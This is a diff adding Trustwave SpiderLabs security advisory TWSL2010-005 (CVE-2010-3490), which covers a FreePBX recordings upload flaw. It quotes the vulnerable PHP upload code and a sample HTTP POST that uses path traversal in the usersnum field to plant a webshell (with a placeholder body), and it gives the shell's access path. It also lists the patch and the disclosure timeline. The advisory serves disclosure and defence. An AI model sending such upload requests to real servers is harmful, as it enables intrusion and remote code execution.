@@ -1,0 +1,173 @@
+Trustwave's SpiderLabs Security Advisory TWSL2010-005:
+FreePBX recordings interface allows remote code execution
+
+https://www.trustwave.com/spiderlabs/advisories/TWSL2010-005.txt
+
+Published: 2010-09-23
+Version: 1.0
+
+Vendor: FreePBX (http://www.freepbx.org/)
+Product: FreePBX and VOIP solutions (AsteriskNOW, TrixBox, etc) using it
+Version(s) affected: 2.8.0 and below
+
+Product Description:
+FreePBX is an easy to use GUI (graphical user interface) that controls and
+manages Asterisk, the world's most popular open source telephony engine
+software. FreePBX has been developed and hardened by thousands of
+volunteers,has been downloaded over 5,000,000 times, and is utilized in an
+estimated 500,000 active phone systems.
+
+Source: http://www.freepbx.org
+Credit: Wendel G. Henrique of Trustwave's SpiderLabs
+
+CVE: CVE-2010-3490
+
+Finding:
+The configuration interface for FreePBX is prone to a remote arbitrary code
+execution on the system recordings menu. FreePBX doesn't handle file uploads
+in a secure manner, allowing an attacker to manipulate the file extension
+and the beginning of the uploaded file name.
+
+The piece of code below, found in page.recordings.php, illustrates part of
+the recordings upload feature.
+
+/* Code removed to fit better on advisory */
+
+<?php
+  if (isset($_FILES['ivrfile']['tmp_name']) &&
+  is_uploaded_file($_FILES['ivrfile']['tmp_name'])) {
+    if (empty($usersnum)) {
+      $dest = "unnumbered-";
+    } else {
+      $dest = "{$usersnum}-";
+    }
+    $suffix = substr(strrchr($_FILES['ivrfile']['name'], "."), 1);
+    $destfilename = $recordings_save_path.$dest."ivrrecording.".$suffix;
+    move_uploaded_file($_FILES['ivrfile']['tmp_name'], $destfilename);
+    echo "<h6>"._("Successfully uploaded")."
+      ".$_FILES['ivrfile']['name']."</h6>";
+    $rname = rtrim(basename($_FILES['ivrfile']['name'], $suffix), '.');
+  } ?>
+
+/* Code removed to fit better on advisory */
+
+When a file is uploaded, a copy is saved temporarily under the /tmp/
+directory, where the name of the file is composed of
+user-controlled-staticname.extension, where:
+
+"user-controlled" is $usersnum variable.
+"staticname" value is -ivrrecording.
+"extension" is controlled by the user.
+
+If $usersnum variable is not defined, then a static string (unnumbered)
+is used.
+
+Finally, when the user clicks on the save button on the System Recordings
+interface, the file is saved with the original file name provided by the
+user under the /var/lib/asterisk/sounds/custom/ directory.
+
+When uploading a file, an attacker can manipulate the $usersnum variable to
+perform a path traversal attack and save it anyplace that the web server
+user has access, for example the Apache's DocumentRoot. This allows an
+attacker to upload malicious code to the web server and execute it under the
+webserver's access permissions.
+
+The HTTP request below illustrates the upload of a phpshell.
+
+POST /admin/config.php HTTP/1.1
+Host: 10.10.1.3
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5;
+en-US; rv:1.9.1.7) Gecko/20101221 Firefox/3.5.7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://10.10.1.3/admin/config.php
+Cookie: ARI=cookieValue; PHPSESSID=cookieValue
+Authorization: Basic base64auth
+Content-Type: multipart/form-data;
+boundary=---------------------------5991806838789183981588991120
+Content-Length: 116089
+
+-----------------------------5991806838789183981588991120
+Content-Disposition: form-data; name="display"
+
+recordings
+-----------------------------5991806838789183981588991120
+Content-Disposition: form-data; name="action"
+
+recordings_start
+-----------------------------5991806838789183981588991120
+Content-Disposition: form-data; name="usersnum"
+
+../../../../../var/www/html/admin/SpiderLabs
+-----------------------------5991806838789183981588991120
+Content-Disposition: form-data; name="ivrfile"; filename="webshell.php"
+Content-Type: application/octet-stream
+
+<?php
+/* WebShell code goes here */
+?>
+
+-----------------------------5991806838789183981588991120--
+
+To access the webshell in this example, an attacker would use
+the following path: http://10.10.1.3/admin/SpiderLabs-ivrrecording.php
+
+Maintainer Response:
+The maintainer has released a patch to address this issue for all versions
+of the software 2.3 and newer.
+
+Details of the patch can be found here:
+http://www.freepbx.org/trac/ticket/4553
+
+Remediation Steps: 
+Install the maintainer-provided patch.
+
+Vendor Communication Timeline:
+08/13/10 - Initial contact
+08/18/10 - Vulnerability disclosed
+09/16/10 - Initial fix proposed by maintainer
+09/22/10 - Fix reviewed, improved, and released by maintainer
+09/23/10 - Advisory public release
+
+Revision History: 
+1.0 Initial publication
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave's SpiderLabs:
+SpiderLabs is the advance security team at Trustwave responsible for
+incident response and forensics, ethical hacking and application security
+tests for Trustwave's clients. SpiderLabs has responded to hundreds of
+security incidents, performed thousands of ethical hacking exercises and
+tested the security of hundreds of business applications for Fortune 500
+organizations. For more information visit
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
